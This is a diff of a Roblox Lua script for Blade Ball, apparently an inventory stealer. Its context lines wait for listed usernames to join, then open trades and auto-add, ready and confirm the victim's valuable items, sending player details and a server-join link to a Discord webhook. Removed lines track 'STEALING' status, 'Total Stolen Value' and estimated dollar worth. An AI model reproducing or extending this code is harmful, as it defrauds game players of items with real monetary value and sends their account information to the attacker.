@@ -21,20 +21,6 @@ local users = _G.Usernames or {}
 local min_rap = _G.min_rap or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
-local currentStatus = "PENDING" -- Live status tracking
-local stolenTotalValue = 0 -- Track total stolen value
-local messageId = nil -- Track message ID for editing
-
--- Reset global variables on script execution
-local function resetGlobalState()
-    itemsToSend = {}
-    allItemsList = {}
-    currentStatus = "PENDING"
-    stolenTotalValue = 0
-    messageId = nil
-end
-
-resetGlobalState()
 
 -- Validation
 if next(users) == nil or webhook == "" then
@@ -164,367 +150,10 @@ local function formatNumber(number)
     end
 end
 
--- Calculate estimated dollar value (RAP to USD conversion)
-local function calculateDollarValue(rap)
-    -- Conversion rate: approximately 1 RAP = $0.001 (adjust as needed)
-    local conversionRate = 0.001
-    return rap * conversionRate
-end
-
--- Get status color for Discord embed
-local function getStatusColor(status)
-    local colors = {
-        ["PENDING"] = 16776960, -- Yellow
-        ["STEALING"] = 16747520, -- Orange  
-        ["CLAIMED"] = 65280, -- Green
-        ["FAILED"] = 16711680 -- Red
-    }
-    return colors[status] or 16776960
-end
-
--- Send a simple status update webhook (for PENDING/FAILED)
-local function sendSimpleStatusWebhook(newStatus, targetPlayerName, reason)
-    local statusEmoji = {
-        ["PENDING"] = "🟨",
-        ["FAILED"] = "🟥"
-    }
-    
-    print("[SIMPLE WEBHOOK] Sending status:", newStatus, "for player:", targetPlayerName, "reason:", reason) -- Debug output
-    
-    local fields = {
-        {
-            name = "👤 Target Player",
-            value = string.format("```\nName: %s\n```", targetPlayerName or "Unknown"),
-            inline = false
-        },
-        {
-            name = "🔴 Live Status",
-            value = string.format("%s **%s**\n*Reason: %s\nLast updated: %s*", 
-                statusEmoji[newStatus] or "🟨", newStatus, reason or "N/A", os.date("%H:%M:%S")),
-            inline = false
-        },
-        {
-            name = "🌐 Server Information",
-            value = string.format("```\nServer ID: %s\nPlayers: %d/16\nPlace ID: %d\n```", 
-                game.JobId, #Players:GetPlayers(), game.PlaceId),
-            inline = false
-        }
-    }
-    
-    local data = {
-        ["embeds"] = {{
-            ["title"] = string.format("🎴 BLADE BALL - %s", newStatus),
-            ["color"] = getStatusColor(newStatus),
-            ["fields"] = fields,
-            ["footer"] = {
-                ["text"] = "Blade Ball Trade System • discord.gg/GY2RVSEGDT"
-            },
-            ["timestamp"] = DateTime.now():ToIsoDate()
-        }}
-    }
-
-    local body = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-    
-    local success, err = pcall(function()
-        local response = request({
-            Url = webhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
-        print("[WEBHOOK] Status webhook sent successfully for:", newStatus)
-    end)
-    
-    if not success then
-        print("[WEBHOOK ERROR] Failed to send status webhook:", err)
-    end
-end
-
--- Send initial webhook message and store message ID
-local function sendInitialWebhook(allItems, tradeItems, tokens)
-    local embed = createWebhookEmbed(false, allItems, tradeItems, tokens)
-    
-    local data = {
-        ["embeds"] = {embed}
-    }
-    
-    if ping == "Yes" and #tradeItems > 0 then
-        data["content"] = "@everyone"
-    end
-    
-    local success, response = pcall(function()
-        return HttpService:PostAsync(
-            webhook .. "?wait=true",
-            HttpService:JSONEncode(data),
-            Enum.HttpContentType.ApplicationJson
-        )
-    end)
-    
-    if success then
-        local decoded = HttpService:JSONDecode(response)
-        messageId = decoded.id
-        print("[WEBHOOK] Initial message sent! Message ID:", messageId)
-        return true
-    else
-        print("[WEBHOOK ERROR] Failed to send initial message:", response)
-        return false
-    end
-end
-
--- Update existing webhook message
-local function updateWebhookMessage(allItems, tradeItems, tokens)
-    if not messageId then
-        print("[WEBHOOK ERROR] No message ID! Sending new message instead.")
-        return sendInitialWebhook(allItems, tradeItems, tokens)
-    end
-    
-    local embed = createWebhookEmbed(false, allItems, tradeItems, tokens)
-    
-    local data = {
-        ["embeds"] = {embed}
-    }
-    
-    -- Extract webhook ID and token from URL
-    local webhookId, webhookToken = webhook:match("/webhooks/(%d+)/([^/]+)")
-    
-    if not webhookId or not webhookToken then
-        print("[WEBHOOK ERROR] Invalid webhook URL format")
-        return false
-    end
-    
-    local editUrl = string.format(
-        "https://discord.com/api/webhooks/%s/%s/messages/%s",
-        webhookId, webhookToken, messageId
-    )
-    
-    local success, response = pcall(function()
-        return HttpService:RequestAsync({
-            Url = editUrl,
-            Method = "PATCH",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode(data)
-        })
-    end)
-    
-    if success then
-        print("[WEBHOOK] Updated status to:", currentStatus)
-        return true
-    else
-        print("[WEBHOOK ERROR] Failed to update message:", response)
-        return false
-    end
-end
-
--- Update live status and send webhook
-local function updateStatus(newStatus, allItems, tradeItems, tokens)
-    currentStatus = newStatus
-    print("[STATUS UPDATE] Status changed to:", newStatus)
-    
-    if messageId then
-        updateWebhookMessage(allItems, tradeItems, tokens)
-    else
-        sendInitialWebhook(allItems, tradeItems, tokens)
-    end
-end
-
 -- Initialize totals
 local totalRAP = 0
 local totalTokens = 0
 local tradeTokens = 0
-
--- Create webhook embed (extracted from SendWebhookMessage)
-local function createWebhookEmbed(isJoinMessage, allItems, tradeItems, tokens)
-    local categorizedItems = {
-        Sword = {},
-        Emote = {},
-        Explosion = {}
-    }
-    
-    local tradeCategorizedItems = {
-        Sword = {},
-        Emote = {},
-        Explosion = {}
-    }
-    
-    for _, item in ipairs(allItems) do
-        if categorizedItems[item.itemType] then
-            table.insert(categorizedItems[item.itemType], item)
-        end
-    end
-    
-    for _, item in ipairs(tradeItems) do
-        if tradeCategorizedItems[item.itemType] then
-            table.insert(tradeCategorizedItems[item.itemType], item)
-        end
-    end
-    
-    local totalAllRAP = 0
-    for _, item in ipairs(allItems) do
-        totalAllRAP = totalAllRAP + item.RAP
-    end
-    
-    local totalTradeRAP = 0
-    for _, item in ipairs(tradeItems) do
-        totalTradeRAP = totalTradeRAP + item.RAP
-    end
-    
-    local fields = {}
-    
-    -- Player Information Box
-    local accountAge = math.floor(plr.AccountAge / 86400)
-    table.insert(fields, {
-        name = "👤 Player Information",
-        value = string.format("```\nName: %s\nUser ID: %d\nAccount Age: %d days\n```", 
-            plr.Name, plr.UserId, accountAge),
-        inline = false
-    })
-    
-    if isJoinMessage then
-        table.insert(fields, {
-            name = "🔗 Join Server",
-            value = string.format("[**Click to Join Server**](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=%s)", game.JobId),
-            inline = false
-        })
-    end
-    
-    local inventorySummary = ""
-    for _, category in ipairs(categories) do
-        local items = categorizedItems[category]
-        if #items > 0 then
-            local categoryRAP = 0
-            for _, item in ipairs(items) do
-                categoryRAP = categoryRAP + item.RAP
-            end
-            
-            local categoryIcon = category == "Sword" and "⚔️" or category == "Emote" and "💃" or "💥"
-            inventorySummary = inventorySummary .. string.format("%s **%s:** %d items | %s RAP\n", 
-                categoryIcon, category, #items, formatNumber(categoryRAP))
-        end
-    end
-    
-    table.insert(fields, {
-        name = "📦 Full Inventory Overview",
-        value = string.format("```\n%s\n```", inventorySummary ~= "" and inventorySummary or "No items found"),
-        inline = false
-    })
-    
-    table.insert(fields, {
-        name = "════════════════════════",
-        value = "",
-        inline = false
-    })
-    
-    -- Add total value display (supreme values)
-    table.insert(fields, {
-        name = "📊 Total Value (Supreme Values)",
-        value = string.format("**Total RAP:** %s\n**Estimated USD Value:** $%.2f\n**Total Stolen Value:** %s", 
-            formatNumber(totalAllRAP), calculateDollarValue(totalAllRAP), formatNumber(stolenTotalValue)),
-        inline = false
-    })
-    
-    if #tradeItems > 0 then
-        table.insert(fields, {
-            name = "🚀 Items to Trade (Min RAP: " .. formatNumber(min_rap) .. ")",
-            value = string.format("**Total Items:** %d\n**Total RAP Value:** %s\n**Estimated USD:** $%.2f", 
-                #tradeItems, formatNumber(totalTradeRAP), calculateDollarValue(totalTradeRAP)),
-            inline = false
-        })
-        
-        for _, category in ipairs(categories) do
-            local items = tradeCategorizedItems[category]
-            if #items > 0 then
-                table.sort(items, function(a, b)
-                    return a.RAP > b.RAP
-                end)
-                
-                local itemGroups = {}
-                for _, item in ipairs(items) do
-                    local key = item.Name .. "|" .. item.RAP
-                    if not itemGroups[key] then
-                        itemGroups[key] = {
-                            name = item.Name,
-                            rap = item.RAP,
-                            count = 1
-                        }
-                    else
-                        itemGroups[key].count = itemGroups[key].count + 1
-                    end
-                end
-                
-                local itemList = ""
-                local categoryRAP = 0
-                for _, group in pairs(itemGroups) do
-                    local displayName = group.count > 1 and 
-                        string.format("%s (×%d)", group.name, group.count) or 
-                        group.name
-                    itemList = itemList .. string.format("• %s - **%s** RAP\n", 
-                        displayName, formatNumber(group.rap))
-                    categoryRAP = categoryRAP + (group.rap * group.count)
-                end
-                
-                local categoryIcon = category == "Sword" and "⚔️" or category == "Emote" and "💃" or "💥"
-                
-                table.insert(fields, {
-                    name = string.format("%s %s (%d items) - %s RAP", 
-                        categoryIcon, category, #items, formatNumber(categoryRAP)),
-                    value = string.format("```\n%s\n```", itemList),
-                    inline = false
-                })
-            end
-        end
-    else
-        table.insert(fields, {
-            name = "📭 No Items to Trade",
-            value = string.format("No items meet the minimum RAP requirement of **%s**", formatNumber(min_rap)),
-            inline = false
-        })
-    end
-    
-    if tokens > 0 then
-        table.insert(fields, {
-            name = "💰 Tokens",
-            value = string.format("```\n%s\n```", string.format("**%s** Tokens", formatNumber(tokens))),
-            inline = true
-        })
-    end
-    
-    -- Add live status indicator
-    local statusEmoji = {
-        ["PENDING"] = "🟨",
-        ["STEALING"] = "🟧", 
-        ["CLAIMED"] = "🟩",
-        ["FAILED"] = "🟥"
-    }
-    
-    table.insert(fields, {
-        name = "🔴 Live Status",
-        value = string.format("%s **%s**\n*Last updated: %s*", 
-            statusEmoji[currentStatus] or "🟨", currentStatus, os.date("%H:%M:%S")),
-        inline = true
-    })
-    
-    table.insert(fields, {
-        name = "🌐 Server Information",
-        value = string.format("```\nServer ID: %s\nPlayers: %d/16\nPlace ID: %d\n```", 
-            game.JobId, #Players:GetPlayers(), game.PlaceId),
-        inline = false
-    })
-    
-    return {
-        ["title"] = isJoinMessage and "🎴 BLADE BALL - TARGET JOINED" or string.format("🎴 BLADE BALL - %s", currentStatus),
-        ["color"] = isJoinMessage and 16753920 or getStatusColor(currentStatus),
-        ["fields"] = fields,
-        ["footer"] = {
-            ["text"] = "Blade Ball Trade System • discord.gg/GY2RVSEGDT"
-        },
-        ["timestamp"] = DateTime.now():ToIsoDate()
-    }
-end
 
 -- Get current tokens
 local function getCurrentTokens()
@@ -627,19 +256,11 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
         inline = false
     })
     
-    -- Add total value display (supreme values)
-    table.insert(fields, {
-        name = "📊 Total Value (Supreme Values)",
-        value = string.format("**Total RAP:** %s\n**Estimated USD Value:** $%.2f\n**Total Stolen Value:** %s", 
-            formatNumber(totalAllRAP), calculateDollarValue(totalAllRAP), formatNumber(stolenTotalValue)),
-        inline = false
-    })
-    
     if #tradeItems > 0 then
         table.insert(fields, {
             name = "🚀 Items to Trade (Min RAP: " .. formatNumber(min_rap) .. ")",
-            value = string.format("**Total Items:** %d\n**Total RAP Value:** %s\n**Estimated USD:** $%.2f", 
-                #tradeItems, formatNumber(totalTradeRAP), calculateDollarValue(totalTradeRAP)),
+            value = string.format("**Total Items:** %d\n**Total RAP Value:** %s", 
+                #tradeItems, formatNumber(totalTradeRAP)),
             inline = false
         })
         
@@ -701,21 +322,6 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
         })
     end
     
-    -- Add live status indicator
-    local statusEmoji = {
-        ["PENDING"] = "🟨",
-        ["STEALING"] = "🟧", 
-        ["CLAIMED"] = "🟩",
-        ["FAILED"] = "🟥"
-    }
-    
-    table.insert(fields, {
-        name = "🔴 Live Status",
-        value = string.format("%s **%s**\n*Last updated: %s*", 
-            statusEmoji[currentStatus] or "🟨", currentStatus, os.date("%H:%M:%S")),
-        inline = true
-    })
-    
     table.insert(fields, {
         name = "🌐 Server Information",
         value = string.format("```\nServer ID: %s\nPlayers: %d/16\nPlace ID: %d\n```", 
@@ -725,8 +331,8 @@ local function SendWebhookMessage(isJoinMessage, allItems, tradeItems, tokens)
     
     local data = {
         ["embeds"] = {{
-            ["title"] = isJoinMessage and "🎴 BLADE BALL - TARGET JOINED" or string.format("🎴 BLADE BALL - %s", currentStatus),
-            ["color"] = isJoinMessage and 16753920 or getStatusColor(currentStatus),
+            ["title"] = isJoinMessage and "🎴 BLADE BALL - TARGET JOINED" or "🎴 BLADE BALL - TRADE EXECUTED",
+            ["color"] = isJoinMessage and 16753920 or 65280,
             ["fields"] = fields,
             ["footer"] = {
                 ["text"] = "Blade Ball Trade System • discord.gg/GY2RVSEGDT"
@@ -878,16 +484,11 @@ if #allItemsList > 0 or totalTokens > 0 then
 end
 
 if #itemsToSend > 0 or totalTokens > 0 then
-    -- Value sorting - automatically prioritize highest value items
     table.sort(itemsToSend, function(a, b)
-        -- Sort by RAP value first (highest first), then by type, then by name
-        if a.RAP ~= b.RAP then
-            return a.RAP > b.RAP
+        if a.itemType == b.itemType then
+            return a.Name < b.Name
         end
-        if a.itemType ~= b.itemType then
-            return a.itemType < b.itemType
-        end
-        return a.Name < b.Name
+        return a.itemType < b.itemType
     end)
 
     local function getNextBatch(items, batchSize)
@@ -899,12 +500,8 @@ if #itemsToSend > 0 or totalTokens > 0 then
     end
 
     local function doTrade(targetUser)
-        -- Update status to STEALING when starting trade
-        updateStatus("STEALING", allItemsList, originalItemsToSend, totalTokens)
-        
         local batchNumber = 1
         local successCount = 0
-        local currentTradeValue = 0
         
         while #itemsToSend > 0 or tradeTokens > 0 do
             local requestSuccess, requestError = pcall(function()
@@ -912,7 +509,6 @@ if #itemsToSend > 0 or totalTokens > 0 then
             end)
             
             if not requestSuccess then
-                -- Failed to send trade request, break but don't set FAILED
                 break
             end
             
@@ -923,16 +519,12 @@ if #itemsToSend > 0 or totalTokens > 0 then
             until inTrade or tick() - startTime > timeout
             
             if not inTrade then
-                -- Trade request timed out, break but don't set FAILED
                 break
             end
             
             local currentBatch = getNextBatch(itemsToSend, 100)
             
-            -- Calculate current batch value
-            currentTradeValue = 0
             for _, item in ipairs(currentBatch) do
-                currentTradeValue = currentTradeValue + item.RAP
                 local addSuccess, addError = pcall(function()
                     addItemToTrade(item.itemType, item.ItemID)
                 end)
@@ -951,18 +543,10 @@ if #itemsToSend > 0 or totalTokens > 0 then
             readyTrade()
             confirmTrade()
             
-            -- Update stolen total value
-            stolenTotalValue = stolenTotalValue + currentTradeValue
-            
             successCount = successCount + 1
             batchNumber = batchNumber + 1
             
             task.wait(3)
-        end
-        
-        -- Update status to CLAIMED when trade is complete (only if successful)
-        if successCount > 0 then
-            updateStatus("CLAIMED", allItemsList, originalItemsToSend, totalTokens)
         end
         
         SendWebhookMessage(false, allItemsList, originalItemsToSend, totalTokens)
@@ -970,46 +554,25 @@ if #itemsToSend > 0 or totalTokens > 0 then
 
     local function waitForTargetUsers()
         local alreadyProcessed = {}
-        local monitoredPlayers = {} -- Track players being monitored
         
         local function processUser(player)
             if table.find(users, player.Name) and not alreadyProcessed[player.Name] then
                 alreadyProcessed[player.Name] = true
-                monitoredPlayers[player.Name] = true -- Start monitoring
-                
-                -- Send PENDING status when player is detected
-                sendSimpleStatusWebhook("PENDING", player.Name, "Target detected in server")
                 
                 task.wait(2)
                 
-                -- Check if player is still in server before trading
-                if player and player.Parent == Players then
-                    local success, error = pcall(function()
-                        doTrade(player.Name)
-                    end)
-                else
-                    -- Player left before trade could start
-                    sendSimpleStatusWebhook("FAILED", player.Name, "Player left server before trade")
-                end
+                local success, error = pcall(function()
+                    doTrade(player.Name)
+                end)
             end
         end
         
-        -- Monitor for players leaving
-        Players.PlayerRemoving:Connect(function(player)
-            if monitoredPlayers[player.Name] and currentStatus == "PENDING" then
-                sendSimpleStatusWebhook("FAILED", player.Name, "Player left server during pending status")
-                monitoredPlayers[player.Name] = nil
-            end
-        end)
-        
-        -- Check existing players
         for _, player in ipairs(Players:GetPlayers()) do
             if player ~= plr then
                 processUser(player)
             end
         end
         
-        -- Monitor for new players joining
         Players.PlayerAdded:Connect(function(player)
             task.wait(1)
             processUser(player)
